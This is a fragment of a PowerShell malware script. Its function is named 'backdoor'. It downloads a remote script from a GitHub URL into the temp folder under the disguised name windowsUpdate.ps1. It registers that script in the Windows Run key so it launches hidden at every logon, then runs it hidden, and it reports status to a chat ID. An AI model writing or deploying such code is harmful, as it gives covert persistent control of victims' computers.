...
$ChatID = '1913579690'
$githubScript = 'https://github.com/Cyclonicrazor/Placeholder/blob/main/pos.ps1'
...
function backdoor {
        ...
        Invoke-WebRequest -Uri $githubScript -OutFile %TEMP%\windowsUpdate.ps1

        Send-Message "Adding_to_the_reg.."
		reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v windowsUpdate /t REG_SZ /d "powershell.exe -windowstyle hidden -file %TEMP%\windowsUpdate.ps1"
        ...
        $command = cmd.exe /c "powershell.exe -windowstyle hidden -file %TEMP%\windowsUpdate.ps1"
